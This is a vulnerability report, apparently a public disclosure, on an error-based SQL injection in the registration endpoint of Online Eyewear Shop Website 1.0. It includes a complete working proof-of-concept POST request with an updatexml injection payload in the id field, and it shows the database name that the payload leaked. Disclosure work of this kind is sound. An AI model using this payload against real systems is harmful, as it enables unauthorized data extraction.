## Online Eyewear Shop Website has a front-end SQL injection vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
/oews/classes/Users.php?f=registration

## Description:
The online eyewear store website 1.0 has a SQL injection attack in the id parameter in the route /oews/classes/Users.php?f=registration. Attackers can exploit this vulnerability to directly obtain sensitive information from the server.

Status: CRITICAL

POC
```
POST /oews/classes/Users.php?f=registration HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------253095177828050286912619499488
Content-Length: 1219
Origin: http://localhost
Connection: close
Referer: http://localhost/oews/?p=user
Cookie: PHPSESSID=4bo37p217s2osfnh7ovs48s6p9
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------253095177828050286912619499488
Content-Disposition: form-data; name="id"

1' and updatexml(1,concat(0x7e,(database())),3)-- q
-----------------------------253095177828050286912619499488
Content-Disposition: form-data; name="firstname"

Mark
-----------------------------253095177828050286912619499488
Content-Disposition: form-data; name="middlename"

D
-----------------------------253095177828050286912619499488
Content-Disposition: form-data; name="lastname"

Cooper
-----------------------------253095177828050286912619499488
Content-Disposition: form-data; name="gender"

Male
-----------------------------253095177828050286912619499488
Content-Disposition: form-data; name="email"

mcooper@mail.com
-----------------------------253095177828050286912619499488
Content-Disposition: form-data; name="contact"

0912356498
-----------------------------253095177828050286912619499488
Content-Disposition: form-data; name="password"


-----------------------------253095177828050286912619499488
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------253095177828050286912619499488--
```

Get the database name directly through the error report: oews_db

![CleanShot 2025-03-18 at 13 30 53@2x](https://github.com/user-attachments/assets/581f0a52-a3b1-4b3a-9101-c0004c591db2)

## Code Analysis
The id parameter is controllable and directly introduced into the SQL statement, causing a SQL injection vulnerability.
![CleanShot 2025-03-18 at 13 31 34@2x](https://github.com/user-attachments/assets/80d82932-c85a-4a25-9922-28ad09f7f866)


